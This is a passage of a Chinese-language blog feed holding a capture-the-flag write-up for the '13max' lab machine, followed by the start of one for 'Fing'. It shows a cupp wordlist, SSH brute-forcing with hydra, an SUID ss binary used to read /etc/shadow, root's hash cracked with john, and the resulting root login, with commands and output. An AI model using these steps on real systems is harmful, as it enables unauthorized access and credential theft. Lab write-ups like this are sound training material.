.bash_logout<br>-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc<br>drwxr-xr-x 3 welcome welcome 4096 Jul  4 07:21 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile<br>-rw-r--r-- 1 welcome welcome   44 Jul  4 10:56 user.txt<br>www-data@13max:/home/welcome$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-a5e162ba751904d59ebd8fed2fce8880&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取welcome权限"><a href="#1、获取welcome权限" class="headerlink" title="1、获取welcome权限"></a>1、获取welcome权限</h2><h3 id="1-cupp制作密码字典"><a href="#1-cupp制作密码字典" class="headerlink" title="1-cupp制作密码字典"></a>1-cupp制作密码字典</h3><p>在<code>max</code>用户目录下面，找到<code>.hint</code>，又找到<code>.pucc</code>，提示使用<code>cupp.py</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@13max:/home/max/.hint$ <span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 2 max max 4096 Jul  4 10:30 .<br>drwxr-xr-x 3 max max 4096 Jul  4 11:03 ..<br>-rw-r--r-- 1 max max  315 Jul  4 10:30 .pucc<br>www-data@13max:/home/max/.hint$ <span class="hljs-built_in">cat</span> .pucc <br>   cupp.py!                 <span class="hljs-comment"># Common</span><br>      \                     <span class="hljs-comment"># User</span><br>       \   ,__,             <span class="hljs-comment"># Passwords</span><br>        \  (oo)____         <span class="hljs-comment"># Profiler</span><br>           (__)    )\   <br>              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]<br>                            [ Mebus | https://github.com/Mebus/]<br></code></pre></td></tr></table></figure><p>使用<code>welcome.txt</code>里面的用户名，制作子典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max/cupp-master]<br>└─# ./cupp.py -w welcome.txt<br>/miao/maze-sec/13max/cupp-master/./cupp.py:161: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;      \                     # \033[07mU\033[27mser&quot;</span>)<br>/miao/maze-sec/13max/cupp-master/./cupp.py:162: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;       \   \033[1;31m,__,\033[1;m             # \033[07mP\033[27masswords&quot;</span>)<br>/miao/maze-sec/13max/cupp-master/./cupp.py:164: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-string">&quot;        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # \033[07mP\033[27mrofiler&quot;</span><br>/miao/maze-sec/13max/cupp-master/./cupp.py:166: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;           \033[1;31m(__)    )\ \033[1;m  &quot;</span>)<br> ___________ <br>   cupp.py!                 <span class="hljs-comment"># Common</span><br>      \                     <span class="hljs-comment"># User</span><br>       \   ,__,             <span class="hljs-comment"># Passwords</span><br>        \  (oo)____         <span class="hljs-comment"># Profiler</span><br>           (__)    )\   <br>              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]<br>                            [ Mebus | https://github.com/Mebus/]<br><br><br>      *************************************************<br>      *                    WARNING!!!                 *<br>      *         Using large wordlists <span class="hljs-keyword">in</span> some         *<br>      *       options bellow is NOT recommended!      *<br>      *************************************************<br><br>&gt; Do you want to concatenate all words from wordlist? Y/[N]: <br>&gt; Do you want to add special chars at the end of words? Y/[N]: <br>&gt; Do you want to add some random numbers at the end of words? Y/[N]:<br>&gt; Leet mode? (i.e. leet = 1337) Y/[N]: <br><br>[+] Now making a dictionary...<br>[+] Sorting list and removing duplicates...<br>[+] Saving dictionary to welcome.txt.cupp.txt, counting 727 words.<br>&gt; Hyperspeed Print? (Y/n) : <br>[+] Now load your pistolero with welcome.txt.cupp.txt and shoot! Good luck!<br></code></pre></td></tr></table></figure><h3 id="2、hydra爆破密码"><a href="#2、hydra爆破密码" class="headerlink" title="2、hydra爆破密码"></a>2、hydra爆破密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max/cupp-master]<br>└─# hydra -t 64 -l welcome -P welcome.txt.cupp.txt ssh://192.168.2.47 -F -I<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-08 22:42:58<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 64 tasks per 1 server, overall 64 tasks, 727 login tries (l:1/p:727), ~12 tries per task<br>[DATA] attacking ssh://192.168.2.47:22/<br>[STATUS] 422.00 tries/min, 422 tries <span class="hljs-keyword">in</span> 00:01h, 354 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 15 active<br>[STATUS] 291.50 tries/min, 583 tries <span class="hljs-keyword">in</span> 00:02h, 197 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 11 active<br>[22][ssh] host: 192.168.2.47   login: welcome   password: Zakaria2020<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.47 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-08 22:45:50<br></code></pre></td></tr></table></figure><p>找到密码<code>Zakaria2020</code></p><h3 id="3、获得welcome权限"><a href="#3、获得welcome权限" class="headerlink" title="3、获得welcome权限"></a>3、获得welcome权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# ssh welcome@192.168.2.47<br>welcome@192.168.2.47<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux 13max 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">welcome@13max:~$ </span><br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>使用<code>linpeas.sh</code>跑一遍，找到一个文件<code>/usr/local/bin/supersuid</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>╔══════════╣ SUID - Check easy privesc, exploits and write perms<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid<br>strace Not Found<br>-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10<br>-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20<br>-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 47K Apr  6  2024 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8<br>-rwsr-xr-x 1 root root 63K Apr  6  2024 /usr/bin/su<br>-rwsr-xr-x 1 root root 35K Apr  6  2024 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)<br>-rwsr-xr-x 1 root root 23K Jan 13  2022 /usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)<br>-rwsr-xr-x 1 root root 179K Jan 14  2023 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable<br>-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)<br>-rwsr-sr-- 1 root welcome 158K Jul  4 10:37 /usr/local/bin/supersuid (Unknown SUID binary!)<br>-rwsr-xr-- 1 root messagebus 51K Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 471K Dec 21  2023 /usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 19K Jan 13  2022 /usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>或者查找和<code>welcome</code>相关的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"> welcome@13max:~$ find / -group welcome 2&gt;/dev/null | grep -Pv <span class="hljs-string">&#x27;sys|proc|run&#x27;</span><br>/usr/local/bin/supersuid<br>/home/welcome<br>/home/welcome/.local<br>/home/welcome/.local/share<br>/home/welcome/.local/share/nano<br>/home/welcome/.bash_logout<br>/home/welcome/.bashrc<br>/home/welcome/user.txt<br>/home/welcome/.profile<br></code></pre></td></tr></table></figure><p>查看文件<code>/usr/local/bin/supersuid</code>，发现类似于网络进程监控<code>netstat，ss</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@13max:/tmp$ /usr/local/bin/supersuid<br>Netid         State         Recv-Q         Send-Q                               Local Address:Port                  Peer Address:Port          <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 13305                            * 13304         <br>u_str         ESTAB         0              0                                                * 13058                            * 13555         <br>u_str         ESTAB         0              0                      /run/dbus/system_bus_socket 13555                            * 13058         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 13124                            * 13123         <br>u_str         ESTAB         0              0                                                * 13553                            * 13554         <br>u_str         ESTAB         0              0                                                * 13554                            * 13553         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 13980                            * 13979         <br>u_str         ESTAB         0              0                                                * 13979                            * 13980         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 12360                            * 12359         <br>u_str         ESTAB         0              0                                                * 12359                            * 12360         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 49511                            * 49510         <br>u_str         ESTAB         0              0                                                * 30313                            * 30314         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 11731                            * 11503         <br>u_str         ESTAB         0              0                                                * 49510                            * 49511         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 13185                            * 13184         <br>u_str         ESTAB         0              0                                                * 30314                            * 30313         <br>u_str         ESTAB         0              0                                                * 13693                            * 13694         <br>u_str         ESTAB         0              0                                                * 14102                            * 14103         <br>u_str         ESTAB         0              0                                                * 13123                            * 13124         <br>u_str         ESTAB         0              0                                                * 13304                            * 13305         <br>u_str         ESTAB         0              0                                                * 13187                            * 13556         <br>u_str         ESTAB         0              0                      /run/dbus/system_bus_socket 30245                            * 30244         <br>u_str         ESTAB         0              0                                                * 13184                            * 13185         <br>u_str         ESTAB         0              0                                                * 29976                            * 0             <br>u_str         ESTAB         0              0                                                * 30244                            * 30245         <br>u_str         ESTAB         0              0                      /run/dbus/system_bus_socket 13556                            * 13187         <br>u_str         ESTAB         0              0                                                * 11503                            * 11731         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 14103                            * 14102         <br>u_str         ESTAB         0              0                                                * 14269                            * 14270         <br>u_str         ESTAB         0              0                                                * 14276                            * 14277         <br>u_str         ESTAB         0              0                                                * 14277                            * 14276         <br>u_str         ESTAB         0              0                      /run/dbus/system_bus_socket 14270                            * 14269         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 30167                            * 30166         <br>u_str         ESTAB         0              0                      /run/dbus/system_bus_socket 14017                            * 14016         <br>u_str         ESTAB         0              0                                                * 14016                            * 14017         <br>u_str         ESTAB         0              0                                                * 30166                            * 30167         <br>u_str         ESTAB         0              0                      /run/systemd/journal/stdout 13694                            * 13693         <br>tcp           ESTAB         0              0                                     192.168.2.50:41246                  192.168.2.4:4444          <br>tcp           ESTAB         0              0                                     192.168.2.50:ssh                    192.168.2.4:49776 <br></code></pre></td></tr></table></figure><p>查看文件的使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@13max:/tmp$ /usr/local/bin/supersuid -<span class="hljs-built_in">help</span><br>Usage: ss [ OPTIONS ]<br>       ss [ OPTIONS ] [ FILTER ]<br>   -h, --<span class="hljs-built_in">help</span>          this message<br>   -V, --version       output version information<br>   -n, --numeric       don<span class="hljs-string">&#x27;t resolve service names</span><br><span class="hljs-string">   -r, --resolve       resolve host names</span><br><span class="hljs-string">   -a, --all           display all sockets</span><br><span class="hljs-string">   -l, --listening     display listening sockets</span><br><span class="hljs-string">   -o, --options       show timer information</span><br><span class="hljs-string">   -e, --extended      show detailed socket information</span><br><span class="hljs-string">   -m, --memory        show socket memory usage</span><br><span class="hljs-string">   -p, --processes     show process using socket</span><br><span class="hljs-string">   -i, --info          show internal TCP information</span><br><span class="hljs-string">       --tipcinfo      show internal tipc socket information</span><br><span class="hljs-string">   -s, --summary       show socket usage summary</span><br><span class="hljs-string">   -b, --bpf           show bpf filter socket information</span><br><span class="hljs-string">   -E, --events        continually display sockets as they are destroyed</span><br><span class="hljs-string">   -Z, --context       display process SELinux security contexts</span><br><span class="hljs-string">   -z, --contexts      display process and socket SELinux security contexts</span><br><span class="hljs-string">   -N, --net           switch to the specified network namespace name</span><br><span class="hljs-string"></span><br><span class="hljs-string">   -4, --ipv4          display only IP version 4 sockets</span><br><span class="hljs-string">   -6, --ipv6          display only IP version 6 sockets</span><br><span class="hljs-string">   -0, --packet        display PACKET sockets</span><br><span class="hljs-string">   -t, --tcp           display only TCP sockets</span><br><span class="hljs-string">   -S, --sctp          display only SCTP sockets</span><br><span class="hljs-string">   -u, --udp           display only UDP sockets</span><br><span class="hljs-string">   -d, --dccp          display only DCCP sockets</span><br><span class="hljs-string">   -w, --raw           display only RAW sockets</span><br><span class="hljs-string">   -x, --unix          display only Unix domain sockets</span><br><span class="hljs-string">       --tipc          display only TIPC sockets</span><br><span class="hljs-string">       --vsock         display only vsock sockets</span><br><span class="hljs-string">   -f, --family=FAMILY display sockets of type FAMILY</span><br><span class="hljs-string">       FAMILY := &#123;inet|inet6|link|unix|netlink|vsock|tipc|help&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   -K, --kill          forcibly close sockets, display what was closed</span><br><span class="hljs-string">   -H, --no-header     Suppress header line</span><br><span class="hljs-string"></span><br><span class="hljs-string">   -A, --query=QUERY, --socket=QUERY</span><br><span class="hljs-string">       QUERY := &#123;all|inet|tcp|udp|raw|unix|unix_dgram|unix_stream|unix_seqpacket|packet|netlink|vsock_stream|vsock_dgram|tipc&#125;[,QUERY]</span><br><span class="hljs-string"></span><br><span class="hljs-string">   -D, --diag=FILE     Dump raw information about TCP sockets to FILE</span><br><span class="hljs-string">   -F, --filter=FILE   read filter information from FILE</span><br><span class="hljs-string">       FILTER := [ state STATE-FILTER ] [ EXPRESSION ]</span><br><span class="hljs-string">       STATE-FILTER := &#123;all|connected|synchronized|bucket|big|TCP-STATES&#125;</span><br><span class="hljs-string">         TCP-STATES := &#123;established|syn-sent|syn-recv|fin-wait-&#123;1,2&#125;|time-wait|closed|close-wait|last-ack|listening|closing&#125;</span><br><span class="hljs-string">          connected := &#123;established|syn-sent|syn-recv|fin-wait-&#123;1,2&#125;|time-wait|close-wait|last-ack|closing&#125;</span><br><span class="hljs-string">       synchronized := &#123;established|syn-recv|fin-wait-&#123;1,2&#125;|time-wait|close-wait|last-ack|closing&#125;</span><br><span class="hljs-string">             bucket := &#123;syn-recv|time-wait&#125;</span><br><span class="hljs-string">                big := &#123;established|syn-sent|fin-wait-&#123;1,2&#125;|closed|close-wait|last-ack|listening|closing&#125;</span><br></code></pre></td></tr></table></figure><p>发现<code>-F</code>，可以读取文件，</p><h3 id="1、读取文件"><a href="#1、读取文件" class="headerlink" title="1、读取文件"></a>1、读取文件</h3><p>读取<code>ssh的私钥</code>或者<code>/etc/shadow</code></p><ul><li><p>读取<code>ssh私钥</code>，发现没有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@13max:/tmp$ /usr/local/bin/supersuid -F /root/.ssh/authorized_keys<br>Cannot find it.<br></code></pre></td></tr></table></figure></li><li><p>读取<code>/etc/shadow</code>，找到<code>root用户</code>密码的哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@13max:/tmp$ /usr/local/bin/supersuid -F /etc/shadow<br>Error: an inet prefix is expected rather than <span class="hljs-string">&quot;root:$6$Cax26XI4SpAAItdE<span class="hljs-variable">$7iVSsRoQT</span>/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7::&quot;</span>.<br>Cannot parse dst/src address.<br></code></pre></td></tr></table></figure></li></ul><h3 id="2、john破解root-hash"><a href="#2、john破解root-hash" class="headerlink" title="2、john破解root-hash"></a>2、john破解root-hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt shadow<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>april7th         (root)     <br>1g 0:00:01:06 DONE (2025-07-08 23:05) 0.01498g/s 2830p/s 2830c/s 2830C/s becky21..anpanman<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>找到root用户的密码<code>april7th</code></p><h3 id="3、获得ROOT权限"><a href="#3、获得ROOT权限" class="headerlink" title="3、获得ROOT权限"></a>3、获得ROOT权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# ssh root@192.168.2.47     <br>root@192.168.2.47<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux 13max 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">root@13max:~# id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@13max:~# <span class="hljs-built_in">cat</span> root.txt<br>flag&#123;root-2722f3c500e0a13673da23cac56e46eb&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h1 id="1、PID读取文件"><a href="#1、PID读取文件" class="headerlink" title="1、PID读取文件"></a>1、PID读取文件</h1><p><code>/proc</code> 目录存储了所有进程的运行时信息，每个pid对应一个子目录，知道PID时，可以读取相关的信息，命令：<code>/proc/pid/cmdline</code></p>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pid</tag>
      
      <tag>lftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fing</title>
    <link href="/Vulnyx/Fing/"/>
    <url>/Vulnyx/Fing/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://vulnyx.com/file/Fing.php">https://vulnyx.com/file/Fing.php</a></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-04 16:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00084s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0013s latency).<br>MAC Address: 08:00:27:20:0E:1A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.45<br>Host is up (0.0014s latency).<br>MAC Address: 08:00:27:DF:B9:AC (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.10 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.45</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/fing]<br>└─# nmap --min-rate 10000 -p- 192.168.2.45                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-04 16:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.45<br>Host is up (0.00019s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>79/tcp open  finger<br>80/tcp open  http<br>MAC Address: 08:00:27:DF:B9:AC (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.07 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,79,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 